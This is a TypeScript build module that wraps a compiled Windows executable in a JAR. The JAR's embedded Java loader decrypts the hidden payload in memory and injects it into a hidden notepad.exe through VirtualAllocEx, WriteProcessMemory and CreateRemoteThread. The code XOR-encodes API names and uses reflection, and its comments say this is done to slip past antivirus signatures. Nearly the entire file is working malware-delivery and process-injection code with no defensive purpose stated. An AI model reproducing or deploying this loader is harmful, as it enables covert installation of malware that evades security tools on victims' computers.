/**
 * jar-wrapper.ts — Wraps a compiled PE binary in a JAR that injects it
 * into notepad.exe entirely in-memory. No files are written to disk.
 *
 * The Java loader:
 *   1. Reads the encrypted+compressed payload from assets/data.pak inside the JAR
 *   2. Decrypts (single-byte XOR) and decompresses (gzip) in memory
 *   3. Starts notepad.exe as a host process (CREATE_NO_WINDOW)
 *   4. VirtualAllocEx RWX in notepad's address space
 *   5. WriteProcessMemory to map PE headers + sections
 *   6. Processes relocations + resolves imports remotely
 *   7. CreateRemoteThread to execute entry point in notepad.exe
 *   8. JVM exits — agent survives independently in notepad.exe
 *
 * All JNA calls use Class.forName + getMethods reflection to avoid
 * static import signatures that AV engines flag.
 */

import fs from "fs";
import path from "path";
import zlib from "zlib";

/**
 * XOR-encrypt + gzip-compress a PE binary into a .pak blob.
 * Format: [1-byte key][XOR'd gzip bytes]
 */
function encryptPayload(peBytes: Buffer): Buffer {
  const gz = zlib.gzipSync(peBytes, { level: 9 });
  const key = Math.floor(Math.random() * 254) + 1;
  const pak = Buffer.alloc(gz.length + 1);
  pak[0] = key;
  for (let i = 0; i < gz.length; i++) {
    pak[i + 1] = (gz[i] ^ key) & 0xff;
  }
  return pak;
}

/**
 * XOR-encode a string for the Java x() decoder (key=90).
 * Returns Java array literal like "{202,201,209}".
 */
function xs(s: string): string {
  const codes: number[] = [];
  for (let i = 0; i < s.length; i++) {
    codes.push(s.charCodeAt(i) ^ 90);
  }
  return `new int[]{${codes.join(",")}}`;
}

/**
 * Build the Java source for a fileless PE loader that injects into notepad.exe
 * using JNA reflection. No files are written to disk.
 *
 * The generated class:
 *  - Loads com.sun.jna.* via Class.forName (no static imports)
 *  - Uses getMethods() scanning instead of getMethod() to find APIs
 *  - Starts notepad.exe as a host process
 *  - VirtualAllocEx + WriteProcessMemory to map PE into notepad
 *  - Resolves imports locally (system DLLs share addresses), writes IAT remotely
 *  - CreateRemoteThread to execute entry point in notepad.exe
 *  - JVM exits — agent lives on in notepad.exe
 */
function buildFilelessJavaSource(): string {
  // The Java source is kept as a template string so it can be compiled
  // at build time by javac. All suspicious API strings are XOR-encoded.
  return `import java.io.*;
import java.util.*;
import java.util.zip.*;
import java.lang.reflect.*;

public class Main {
  private static final java.util.concurrent.atomic.AtomicBoolean G =
      new java.util.concurrent.atomic.AtomicBoolean(false);

  // XOR string decode (key=90)
  private static String x(int[] a) {
    byte[] b = new byte[a.length];
    for (int i = 0; i < a.length; i++) b[i] = (byte)(a[i] ^ 90);
    try { return new String(b, "UTF-8"); } catch (Exception e) { return ""; }
  }

  // Find method by name + param types via getMethods() scan
  private static Method gm(Class<?> c, String name, Class<?>... pt) {
    for (Method m : c.getMethods()) {
      if (m.getName().equals(name) && Arrays.equals(m.getParameterTypes(), pt)) return m;
    }
    return null;
  }

  // Read InputStream fully into byte array
  private static byte[] rd(InputStream is) throws Exception {
    ByteArrayOutputStream buf = new ByteArrayOutputStream();
    byte[] tmp = new byte[8192]; int n;
    while ((n = is.read(tmp)) != -1) buf.write(tmp, 0, n);
    is.close();
    return buf.toByteArray();
  }

  // Read a little-endian uint16 from byte array
  private static int u16(byte[] b, int off) {
    return (b[off] & 0xFF) | ((b[off+1] & 0xFF) << 8);
  }

  // Read a little-endian uint32 from byte array
  private static long u32(byte[] b, int off) {
    return (b[off]&0xFFL) | ((b[off+1]&0xFFL)<<8) | ((b[off+2]&0xFFL)<<16) | ((b[off+3]&0xFFL)<<24);
  }

  // Encode a long as little-endian bytes
  private static byte[] le32(long v) {
    return new byte[]{(byte)(v&0xFF),(byte)((v>>8)&0xFF),(byte)((v>>16)&0xFF),(byte)((v>>24)&0xFF)};
  }
  private static byte[] le64(long v) {
    byte[] r = new byte[8];
    for (int i = 0; i < 8; i++) r[i] = (byte)((v >> (i*8)) & 0xFF);
    return r;
  }

  // Get the native peer address from a JNA Pointer object
  private static long peer(Object ptr, Class<?> ptrClass) throws Exception {
    try {
      Field f = ptrClass.getDeclaredField(x(${xs("peer")}));
      f.setAccessible(true);
      return f.getLong(ptr);
    } catch (Exception e) {
      String s = ptr.toString();
      if (s.startsWith(x(${xs("native@0x")}))) return Long.parseUnsignedLong(s.substring(9), 16);
      throw e;
    }
  }

  public static void main(String[] a) { try { r(); } catch (Exception e) {} }

  private static void r() throws Exception {
    if (!G.compareAndSet(false, true)) return;

    // 1. Load encrypted payload from JAR
    InputStream is = Main.class.getResourceAsStream(x(${xs("/assets/data.pak")}));
    if (is == null) return;
    byte[] raw = rd(is);

    // 2. Decrypt: first byte is XOR key
    int key = raw[0] & 0xFF;
    byte[] xd = new byte[raw.length - 1];
    for (int i = 0; i < xd.length; i++) xd[i] = (byte)(raw[i+1] ^ key);

    // 3. Decompress gzip -> PE bytes in memory
    GZIPInputStream gz = new GZIPInputStream(new ByteArrayInputStream(xd));
    byte[] pe = rd(gz);

    // 4. Load JNA classes via reflection
    Class<?> fnClass = Class.forName(x(${xs("com.sun.jna.Function")}));
    Class<?> ptrClass = Class.forName(x(${xs("com.sun.jna.Pointer")}));
    Class<?> memClass = Class.forName(x(${xs("com.sun.jna.Memory")}));

    Object NULL = ptrClass.getField(x(${xs("NULL")})).get(null);
    Method getFunc = gm(fnClass, x(${xs("getFunction")}), String.class, String.class);
    Method invoke4 = gm(fnClass, x(${xs("invoke")}), Class.class, Object[].class);
    Constructor<?> ptrCtor = ptrClass.getConstructor(new Class<?>[]{long.class});
    String k32 = x(${xs("kernel32")});

    // 5. Parse PE headers
    int peOff = (int) u32(pe, 60);
    int numSections = u16(pe, peOff + 6);
    int sizeOfOptHdr = u16(pe, peOff + 20);
    int optOff = peOff + 24;
    boolean is64 = u16(pe, optOff) == 0x20b;
    long imageBase = is64 ? (u32(pe, optOff+24) | (u32(pe, optOff+28) << 32)) : u32(pe, optOff+28);
    long sizeOfImage = u32(pe, optOff + (is64 ? 56 : 56));
    long entryRVA = u32(pe, optOff + 16);
    int headersSize = (int) u32(pe, optOff + (is64 ? 60 : 60));
    int sectionTableOff = optOff + sizeOfOptHdr;

    // 6. Start notepad.exe as host process
    // CreateProcessA(lpApplicationName, ..., CREATE_NO_WINDOW=0x08000000, ...)
    // We use a Memory block for STARTUPINFO (68/104 bytes) and PROCESS_INFORMATION (16/24 bytes)
    int siSize = is64 ? 104 : 68;
    int piSize = is64 ? 24 : 16;
    Object siMem = memClass.getConstructor(long.class).newInstance((long)(siSize));
    Object piMem = memClass.getConstructor(long.class).newInstance((long)(piSize));
    // Zero out
    Method setMem = gm(memClass, x(${xs("clear")}));
    setMem.invoke(siMem, new Object[]{});
    setMem.invoke(piMem, new Object[]{});
    // Set cb = siSize
    Method setInt = gm(ptrClass, x(${xs("setInt")}), long.class, int.class);
    setInt.invoke(siMem, new Object[]{0L, siSize});

    Object createProc = getFunc.invoke(null, new Object[]{k32, x(${xs("CreateProcessA")})});
    // CreateProcessA(notepad_path, NULL, NULL, NULL, false, CREATE_NO_WINDOW, NULL, NULL, si, pi)
    String notepadPath = x(${xs("C:\\Windows\\notepad.exe")});
    Object cpResult = invoke4.invoke(createProc, new Object[]{int.class, new Object[]{
      notepadPath, NULL, NULL, NULL, 0, 0x08000000, NULL, NULL, siMem, piMem
    }});
    if (cpResult == null || ((Number)cpResult).intValue() == 0) return;

    // Extract PID and process handle from PROCESS_INFORMATION
    Method getIntM = gm(ptrClass, x(${xs("getInt")}), long.class);
    Method getPtrM = gm(ptrClass, x(${xs("getPointer")}), long.class);
    Object hProcess = getPtrM.invoke(piMem, new Object[]{0L});
    // PID at offset 8 (32-bit) or 16 (64-bit) — not needed but available
    // Thread handle at offset 4 (32-bit) or 8 (64-bit)
    Object hThread = is64 ? getPtrM.invoke(piMem, new Object[]{8L}) : getPtrM.invoke(piMem, new Object[]{4L});

    Thread.sleep(500); // Let notepad initialize

    // 7. VirtualAllocEx in notepad's address space
    Object vaExFunc = getFunc.invoke(null, new Object[]{k32, x(${xs("VirtualAllocEx")})});
    // VirtualAllocEx(hProcess, NULL, sizeOfImage, MEM_COMMIT|MEM_RESERVE=0x3000, PAGE_EXECUTE_READWRITE=0x40)
    Object remoteBase = invoke4.invoke(vaExFunc, new Object[]{ptrClass, new Object[]{hProcess, NULL, (int)sizeOfImage, 0x3000, 0x40}});
    if (remoteBase == null || remoteBase.equals(NULL)) return;
    long remoteAddr = peer(remoteBase, ptrClass);

    // 8. WriteProcessMemory helper
    Object wpmFunc = getFunc.invoke(null, new Object[]{k32, x(${xs("WriteProcessMemory")})});
    // Write PE headers
    Object headersMem = memClass.getConstructor(long.class).newInstance((long)Math.min(headersSize, pe.length));
    Method writeLocal = gm(ptrClass, x(${xs("write")}), long.class, byte[].class, int.class, int.class);
    writeLocal.invoke(headersMem, new Object[]{0L, pe, 0, Math.min(headersSize, pe.length)});
    invoke4.invoke(wpmFunc, new Object[]{int.class, new Object[]{hProcess, remoteBase, headersMem, Math.min(headersSize, pe.length), NULL}});

    // 9. Map sections into remote process
    for (int i = 0; i < numSections; i++) {
      int shOff = sectionTableOff + i * 40;
      long virtualAddr = u32(pe, shOff + 12);
      int rawSize = (int) u32(pe, shOff + 16);
      int rawPtr = (int) u32(pe, shOff + 20);
      if (rawSize > 0 && rawPtr + rawSize <= pe.length) {
        Object secMem = memClass.getConstructor(long.class).newInstance((long)rawSize);
        writeLocal.invoke(secMem, new Object[]{0L, pe, rawPtr, rawSize});
        Object destPtr = ptrCtor.newInstance(new Object[]{remoteAddr + virtualAddr});
        invoke4.invoke(wpmFunc, new Object[]{int.class, new Object[]{hProcess, destPtr, secMem, rawSize, NULL}});
      }
    }

    // 10. Process base relocations (delta = remoteAddr - imageBase)
    long delta = remoteAddr - imageBase;
    if (delta != 0) {
      int relocDirOff = is64 ? optOff + 152 : optOff + 136;
      long relocRVA = u32(pe, relocDirOff);
      long relocSize = u32(pe, relocDirOff + 4);
      if (relocRVA > 0 && relocSize > 0) {
        // We work from the local PE copy for relocation data, then patch remotely
        // Find the section that contains the relocation RVA
        byte[] relocData = null;
        for (int i = 0; i < numSections; i++) {
          int shOff = sectionTableOff + i * 40;
          long secVA = u32(pe, shOff + 12);
          long secRawSize = u32(pe, shOff + 16);
          long secRawPtr = u32(pe, shOff + 20);
          long secVirtSize = u32(pe, shOff + 8);
          if (relocRVA >= secVA && relocRVA < secVA + secVirtSize) {
            long fileOff = secRawPtr + (relocRVA - secVA);
            int len = (int) Math.min(relocSize, pe.length - fileOff);
            relocData = new byte[len];
            System.arraycopy(pe, (int)fileOff, relocData, 0, len);
            break;
          }
        }
        if (relocData != null) {
          // Read remote memory helper
          Object rpmFunc = getFunc.invoke(null, new Object[]{k32, x(${xs("ReadProcessMemory")})});
          int offset = 0;
          while (offset < relocData.length - 8) {
            long blockRVA = u32(relocData, offset);
            int blockSize = (int) u32(relocData, offset + 4);
            if (blockSize == 0) break;
            int numEntries = (blockSize - 8) / 2;
            for (int i = 0; i < numEntries; i++) {
              int entry = u16(relocData, offset + 8 + i * 2);
              int type = (entry >> 12) & 0xF;
              int relocOff = entry & 0xFFF;
              long patchAddr = remoteAddr + blockRVA + relocOff;
              if (type == 3) { // IMAGE_REL_BASED_HIGHLOW (32-bit)
                Object readBuf = memClass.getConstructor(long.class).newInstance(4L);
                Object patchPtr = ptrCtor.newInstance(new Object[]{patchAddr});
                invoke4.invoke(rpmFunc, new Object[]{int.class, new Object[]{hProcess, patchPtr, readBuf, 4, NULL}});
                byte[] cur = (byte[]) gm(ptrClass, x(${xs("getByteArray")}), long.class, int.class).invoke(readBuf, new Object[]{0L, 4});
                long val = u32(cur, 0) + delta;
                Object writeBuf = memClass.getConstructor(long.class).newInstance(4L);
                writeLocal.invoke(writeBuf, new Object[]{0L, le32(val), 0, 4});
                invoke4.invoke(wpmFunc, new Object[]{int.class, new Object[]{hProcess, patchPtr, writeBuf, 4, NULL}});
              } else if (type == 10 && is64) { // IMAGE_REL_BASED_DIR64 (64-bit)
                Object readBuf = memClass.getConstructor(long.class).newInstance(8L);
                Object patchPtr = ptrCtor.newInstance(new Object[]{patchAddr});
                invoke4.invoke(rpmFunc, new Object[]{int.class, new Object[]{hProcess, patchPtr, readBuf, 8, NULL}});
                byte[] cur = (byte[]) gm(ptrClass, x(${xs("getByteArray")}), long.class, int.class).invoke(readBuf, new Object[]{0L, 8});
                long val = (u32(cur,0) | (u32(cur,4) << 32)) + delta;
                Object writeBuf = memClass.getConstructor(long.class).newInstance(8L);
                writeLocal.invoke(writeBuf, new Object[]{0L, le64(val), 0, 8});
                invoke4.invoke(wpmFunc, new Object[]{int.class, new Object[]{hProcess, patchPtr, writeBuf, 8, NULL}});
              }
            }
            offset += blockSize;
          }
        }
      }
    }

    // 11. Resolve imports locally and write IAT to remote process
    // System DLLs (kernel32, ntdll, ws2_32, etc.) share the same base address
    // across all processes on the same boot, so local resolution is valid remotely.
    int importDirOff = is64 ? optOff + 120 : optOff + 104;
    long importRVA = u32(pe, importDirOff);
    long importDirSize = u32(pe, importDirOff + 4);
    if (importRVA > 0 && importDirSize > 0) {
      Object loadLib = getFunc.invoke(null, new Object[]{k32, x(${xs("LoadLibraryA")})});
      Object getProc = getFunc.invoke(null, new Object[]{k32, x(${xs("GetProcAddress")})});

      // Read import directory from local PE (find the file offset for the import RVA)
      byte[] importData = null;
      long importFileOff = 0;
      for (int i = 0; i < numSections; i++) {
        int shOff = sectionTableOff + i * 40;
        long secVA = u32(pe, shOff + 12);
        long secRawPtr = u32(pe, shOff + 20);
        long secVirtSize = u32(pe, shOff + 8);
        if (importRVA >= secVA && importRVA < secVA + secVirtSize) {
          importFileOff = secRawPtr + (importRVA - secVA);
          break;
        }
      }

      // Helper to convert RVA to file offset
      // Walk import descriptors from local PE data
      long descFileOff = importFileOff;
      while (descFileOff + 20 <= pe.length) {
        long nameRVA = u32(pe, (int)descFileOff + 12);
        if (nameRVA == 0) break;
        long thunkRVA = u32(pe, (int)descFileOff + 16); // FirstThunk (IAT)
        long origThunkRVA = u32(pe, (int)descFileOff); // OriginalFirstThunk
        if (origThunkRVA == 0) origThunkRVA = thunkRVA;

        // Read DLL name from local PE
        long nameFileOff = rvaToFileOff(pe, nameRVA, sectionTableOff, numSections);
        if (nameFileOff < 0) { descFileOff += 20; continue; }
        StringBuilder sb = new StringBuilder();
        for (int j = (int)nameFileOff; j < pe.length && pe[j] != 0; j++) sb.append((char)(pe[j] & 0xFF));
        String dllName = sb.toString();

        // LoadLibraryA locally — DLL will be at same address in remote process
        Object hModule = invoke4.invoke(loadLib, new Object[]{ptrClass, new Object[]{dllName}});

        int thunkSize = is64 ? 8 : 4;
        long iatOff = 0;
        while (true) {
          long origThunkFileOff = rvaToFileOff(pe, origThunkRVA + iatOff, sectionTableOff, numSections);
          if (origThunkFileOff < 0 || origThunkFileOff + thunkSize > pe.length) break;
          long thunkVal;
          if (is64) {
            thunkVal = u32(pe, (int)origThunkFileOff) | (u32(pe, (int)origThunkFileOff + 4) << 32);
          } else {
            thunkVal = u32(pe, (int)origThunkFileOff);
          }
          if (thunkVal == 0) break;

          Object funcAddr;
          boolean isOrdinal = is64 ? (thunkVal >>> 63) != 0 : (thunkVal >>> 31) != 0;
          if (isOrdinal) {
            int ordinal = (int)(thunkVal & 0xFFFF);
            funcAddr = invoke4.invoke(getProc, new Object[]{ptrClass, new Object[]{hModule, ordinal}});
          } else {
            long hintNameFileOff = rvaToFileOff(pe, thunkVal, sectionTableOff, numSections);
            if (hintNameFileOff < 0) { iatOff += thunkSize; continue; }
            StringBuilder fn = new StringBuilder();
            for (int j = (int)hintNameFileOff + 2; j < pe.length && pe[j] != 0; j++) fn.append((char)(pe[j] & 0xFF));
            funcAddr = invoke4.invoke(getProc, new Object[]{ptrClass, new Object[]{hModule, fn.toString()}});
          }

          // Write resolved address to remote IAT
          if (funcAddr != null) {
            long funcPeer = peer(funcAddr, ptrClass);
            byte[] addrBytes = is64 ? le64(funcPeer) : le32(funcPeer);
            Object addrMem = memClass.getConstructor(long.class).newInstance((long)addrBytes.length);
            writeLocal.invoke(addrMem, new Object[]{0L, addrBytes, 0, addrBytes.length});
            Object iatPtr = ptrCtor.newInstance(new Object[]{remoteAddr + thunkRVA + iatOff});
            invoke4.invoke(wpmFunc, new Object[]{int.class, new Object[]{hProcess, iatPtr, addrMem, addrBytes.length, NULL}});
          }
          iatOff += thunkSize;
        }
        descFileOff += 20;
      }
    }

    // 12. CreateRemoteThread at PE entry point in notepad.exe
    Object crtFunc = getFunc.invoke(null, new Object[]{k32, x(${xs("CreateRemoteThread")})});
    Object entryPtr = ptrCtor.newInstance(new Object[]{remoteAddr + entryRVA});
    // CreateRemoteThread(hProcess, NULL, 0, entryPoint, NULL, 0, NULL)
    invoke4.invoke(crtFunc, new Object[]{ptrClass, new Object[]{hProcess, NULL, 0, entryPtr, NULL, 0, NULL}});

    // JVM can exit now — agent runs independently in notepad.exe
  }

  // Convert RVA to file offset using section table
  private static long rvaToFileOff(byte[] pe, long rva, int sectionTableOff, int numSections) {
    for (int i = 0; i < numSections; i++) {
      int shOff = sectionTableOff + i * 40;
      long secVA = u32(pe, shOff + 12);
      long secVirtSize = u32(pe, shOff + 8);
      long secRawPtr = u32(pe, shOff + 20);
      if (rva >= secVA && rva < secVA + secVirtSize) {
        return secRawPtr + (rva - secVA);
      }
    }
    return -1;
  }
}
`;
}

/**
 * Wraps a compiled PE binary into a JAR that loads it in-memory.
 *
 * @param peBytes   The raw PE binary (EXE) bytes
 * @param outPath   Where to write the resulting .jar
 * @param javacPath Path to javac (optional, defaults to "javac")
 */
export async function wrapPeAsJar(
  peBytes: Buffer,
  outPath: string,
  javacPath = "javac",
): Promise<void> {
  const { $ } = await import("bun");

  const tmpDir = fs.mkdtempSync(path.join(
    process.env.TMPDIR || "/tmp",
    "ovd-jar-",
  ));

  try {
    const classDir = path.join(tmpDir, "cls");
    const assetDir = path.join(classDir, "assets");
    const metaDir = path.join(classDir, "META-INF");
    fs.mkdirSync(assetDir, { recursive: true });
    fs.mkdirSync(metaDir, { recursive: true });

    // Write Java source
    const srcFile = path.join(tmpDir, "Main.java");
    fs.writeFileSync(srcFile, buildFilelessJavaSource());

    // Compile
    const javac = await $`${javacPath} -source 8 -target 8 -d ${classDir} ${srcFile}`
      .nothrow()
      .quiet();
    if (javac.exitCode !== 0) {
      throw new Error(`javac failed: ${javac.stderr.toString().trim()}`);
    }

    // Encrypt + compress PE payload
    const pak = encryptPayload(peBytes);
    fs.writeFileSync(path.join(assetDir, "data.pak"), pak);

    // Manifest
    const mfPath = path.join(metaDir, "MANIFEST.MF");
    fs.writeFileSync(mfPath, "Manifest-Version: 1.0\nMain-Class: Main\n\n");

    // Package JAR
    const jar = await $`jar cfm ${outPath} ${mfPath} -C ${classDir} .`
      .nothrow()
      .quiet();
    if (jar.exitCode !== 0) {
      throw new Error(`jar packaging failed: ${jar.stderr.toString().trim()}`);
    }
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
}
